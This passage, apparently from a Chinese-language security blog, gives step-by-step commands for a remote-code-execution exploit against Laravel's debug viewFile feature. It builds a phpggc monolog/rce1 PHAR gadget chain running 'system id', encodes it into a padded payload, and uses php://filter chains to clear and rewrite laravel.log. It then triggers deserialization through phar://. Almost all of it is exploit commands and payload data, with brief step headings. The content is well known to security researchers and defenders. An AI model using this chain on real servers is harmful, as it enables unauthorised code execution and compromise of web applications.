<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span> <span class="o">-</span><span class="nx">d</span><span class="s1">&#39;phar.readonly=0&#39;</span> <span class="o">./</span><span class="nx">phpggc</span> <span class="nx">monolog</span><span class="o">/</span><span class="nx">rce1</span> <span class="nx">system</span> <span class="nx">id</span> <span class="o">--</span><span class="nx">phar</span> <span class="nx">phar</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">php</span><span class="o">://</span><span class="nx">output</span> <span class="o">|</span> <span class="nx">base64</span> <span class="o">-</span><span class="nx">w0</span> <span class="o">|</span> <span class="nx">sed</span> <span class="o">-</span><span class="nx">E</span> <span class="s1">&#39;s/./\0=00/g&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">s</span><span class="o">=</span><span class="mo">00</span><span class="nx">D</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">M</span><span class="o">=</span><span class="mo">00</span><span class="nx">f</span><span class="o">=</span><span class="mo">00</span><span class="nx">n</span><span class="o">=</span><span class="mo">00</span><span class="o">/=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">F</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">Z</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">00</span><span class="nx">V</span><span class="o">=</span><span class="mo">00</span><span class="nx">t</span><span class="o">=</span><span class="mo">00</span><span class="nx">b</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">00</span><span class="nx">u</span><span class="o">=</span><span class="mo">00</span><span class="nx">d</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">001</span><span class="o">=</span><span class="mo">00</span><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">003</span><span class="o">=</span><span class="mo">00</span><span class="nx">t</span><span class="o">=</span><span class="mo">00</span><span class="nx">r</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">Z</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">00</span><span class="nx">N</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">s</span><span class="o">=</span><span class="mo">00</span><span class="nx">D</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">007</span><span class="o">=</span><span class="mo">00</span><span class="nx">m</span><span class="o">=</span><span class="mo">00</span><span class="nx">z</span><span class="o">=</span><span class="mo">00</span><span class="nx">i</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">O</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">L</span><span class="o">=</span><span class="mo">00</span><span class="nx">n</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">o</span><span class="o">=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">v</span><span class="o">=</span><span class="mo">00</span><span class="nx">c</span><span class="o">=</span><span class="mo">003</span><span class="o">=</span><span class="mo">00</span><span class="nx">R</span><span class="o">=</span><span class="mo">001</span><span class="o">=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">i</span><span class="o">=</span><span class="mo">005</span><span class="o">=</span><span class="mo">00</span><span class="nx">w</span><span class="o">=</span><span class="mo">00</span><span class="nx">a</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">u</span><span class="o">=</span><span class="mo">00</span><span class="nx">d</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">V</span><span class="o">=</span><span class="mo">00</span><span class="nx">y</span><span class="o">=</span><span class="mo">00</span><span class="nx">t</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">h</span><span class="o">=</span><span class="mo">00</span><span class="nx">L</span><span class="o">=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="mi">8</span><span class="o">=</span><span class="mo">00</span><span class="nx">P</span><span class="o">=</span><span class="mo">003</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">o</span><span class="o">=</span><span class="mo">00</span><span class="nx">c</span><span class="o">=</span><span class="mo">00</span><span class="nx">C</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">f</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">h</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">T</span><span class="o">=</span><span class="mo">00</span><span class="nx">F</span><span class="o">=</span><span class="mo">00</span><span class="nx">R</span><span class="o">=</span><span class="mo">00</span><span class="nx">f</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="mi">9</span><span class="o">=</span><span class="mo">00</span><span class="nx">N</span><span class="o">=</span><span class="mo">00</span><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">00</span><span class="nx">M</span><span class="o">=</span><span class="mo">00</span><span class="nx">R</span><span class="o">=</span><span class="mo">00</span><span class="nx">V</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">o</span><span class="o">=</span><span class="mo">00</span><span class="nx">K</span><span class="o">=</span><span class="mo">00</span><span class="nx">T</span><span class="o">=</span><span class="mo">00</span><span class="nx">s</span><span class="o">=</span><span class="mo">00</span><span class="nx">g</span><span class="o">=</span><span class="mo">00</span><span class="nx">P</span><span class="o">=</span><span class="mo">00</span><span class="nx">z</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">N</span><span class="o">=</span><span class="mo">00</span><span class="nx">C</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">L</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">w</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">C</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">D</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">005</span><span class="o">=</span><span class="mo">00</span><span class="o">/=</span><span class="mo">002</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">...=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="o">==</span><span class="mo">00</span><span class="o">==</span><span class="mo">00</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>清空日志</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">viewFile: php://filter/write<span class="o">=</span>convert.base64-decode<span class="p">|</span>convert.base64-decode<span class="p">|</span>convert.base64-decode/resource<span class="o">=</span>/path/to/storage/logs/laravel.log
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建第一个日志条目，用于对齐：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">viewFile: AA
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建带有payload日志条目：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">viewFile</span><span class="o">:</span> <span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">s</span><span class="o">=</span><span class="mo">00</span><span class="nx">D</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">M</span><span class="o">=</span><span class="mo">00</span><span class="nx">f</span><span class="o">=</span><span class="mo">00</span><span class="nx">n</span><span class="o">=</span><span class="mo">00</span><span class="o">/=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">F</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">Z</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">00</span><span class="nx">V</span><span class="o">=</span><span class="mo">00</span><span class="nx">t</span><span class="o">=</span><span class="mo">00</span><span class="nx">b</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">00</span><span class="nx">u</span><span class="o">=</span><span class="mo">00</span><span class="nx">d</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">001</span><span class="o">=</span><span class="mo">00</span><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">003</span><span class="o">=</span><span class="mo">00</span><span class="nx">t</span><span class="o">=</span><span class="mo">00</span><span class="nx">r</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">Z</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">00</span><span class="nx">N</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">s</span><span class="o">=</span><span class="mo">00</span><span class="nx">D</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">007</span><span class="o">=</span><span class="mo">00</span><span class="nx">m</span><span class="o">=</span><span class="mo">00</span><span class="nx">z</span><span class="o">=</span><span class="mo">00</span><span class="nx">i</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">O</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">L</span><span class="o">=</span><span class="mo">00</span><span class="nx">n</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">o</span><span class="o">=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">v</span><span class="o">=</span><span class="mo">00</span><span class="nx">c</span><span class="o">=</span><span class="mo">003</span><span class="o">=</span><span class="mo">00</span><span class="nx">R</span><span class="o">=</span><span class="mo">001</span><span class="o">=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">i</span><span class="o">=</span><span class="mo">005</span><span class="o">=</span><span class="mo">00</span><span class="nx">w</span><span class="o">=</span><span class="mo">00</span><span class="nx">a</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">u</span><span class="o">=</span><span class="mo">00</span><span class="nx">d</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">V</span><span class="o">=</span><span class="mo">00</span><span class="nx">y</span><span class="o">=</span><span class="mo">00</span><span class="nx">t</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">h</span><span class="o">=</span><span class="mo">00</span><span class="nx">L</span><span class="o">=</span><span class="mo">00</span><span class="nx">Y</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="mi">8</span><span class="o">=</span><span class="mo">00</span><span class="nx">P</span><span class="o">=</span><span class="mo">003</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">o</span><span class="o">=</span><span class="mo">00</span><span class="nx">c</span><span class="o">=</span><span class="mo">00</span><span class="nx">C</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">f</span><span class="o">=</span><span class="mo">00</span><span class="nx">X</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="nx">h</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">T</span><span class="o">=</span><span class="mo">00</span><span class="nx">F</span><span class="o">=</span><span class="mo">00</span><span class="nx">R</span><span class="o">=</span><span class="mo">00</span><span class="nx">f</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">000</span><span class="o">=</span><span class="mo">00</span><span class="mi">9</span><span class="o">=</span><span class="mo">00</span><span class="nx">N</span><span class="o">=</span><span class="mo">00</span><span class="nx">U</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">00</span><span class="nx">M</span><span class="o">=</span><span class="mo">00</span><span class="nx">R</span><span class="o">=</span><span class="mo">00</span><span class="nx">V</span><span class="o">=</span><span class="mo">00</span><span class="nx">I</span><span class="o">=</span><span class="mo">00</span><span class="nx">o</span><span class="o">=</span><span class="mo">00</span><span class="nx">K</span><span class="o">=</span><span class="mo">00</span><span class="nx">T</span><span class="o">=</span><span class="mo">00</span><span class="nx">s</span><span class="o">=</span><span class="mo">00</span><span class="nx">g</span><span class="o">=</span><span class="mo">00</span><span class="nx">P</span><span class="o">=</span><span class="mo">00</span><span class="nx">z</span><span class="o">=</span><span class="mo">004</span><span class="o">=</span><span class="mo">00</span><span class="nx">N</span><span class="o">=</span><span class="mo">00</span><span class="nx">C</span><span class="o">=</span><span class="mo">00</span><span class="nx">l</span><span class="o">=</span><span class="mo">00</span><span class="nx">B</span><span class="o">=</span><span class="mo">00</span><span class="nx">L</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">w</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">C</span><span class="o">=</span><span class="mo">00</span><span class="nx">E</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">D</span><span class="o">=</span><span class="mo">00</span><span class="nx">H</span><span class="o">=</span><span class="mo">005</span><span class="o">=</span><span class="mo">00</span><span class="o">/=</span><span class="mo">002</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">=</span><span class="mo">00</span><span class="nx">A</span><span class="o">...=</span><span class="mo">00</span><span class="nx">Q</span><span class="o">=</span><span class="mo">00</span><span class="o">==</span><span class="mo">00</span><span class="o">==</span><span class="mo">00</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过我的过滤器将日志文件转换为有效的PHAR：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">viewFile</span><span class="o">:</span> <span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">write</span><span class="o">=</span><span class="nx">convert</span><span class="o">.</span><span class="nx">quoted</span><span class="o">-</span><span class="nx">printable</span><span class="o">-</span><span class="nx">decode</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">iconv</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">16</span><span class="nx">le</span><span class="o">.</span><span class="nx">utf</span><span class="o">-</span><span class="mi">8</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=/</span><span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">storage</span><span class="o">/</span><span class="nx">logs</span><span class="o">/</span><span class="nx">laravel</span><span class="o">.</span><span class="nx">log</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>启动PHAR的反序列化过程：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">viewFile</span><span class="o">:</span> <span class="nx">phar</span><span class="o">:///</span><span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">storage</span><span class="o">/</span><span class="nx">logs</span><span class="o">/</span><span class="nx">laravel</span><span class="o">.</span><span class="nx">log</span>
</span></span></code></pre></td></tr></table>
</div>
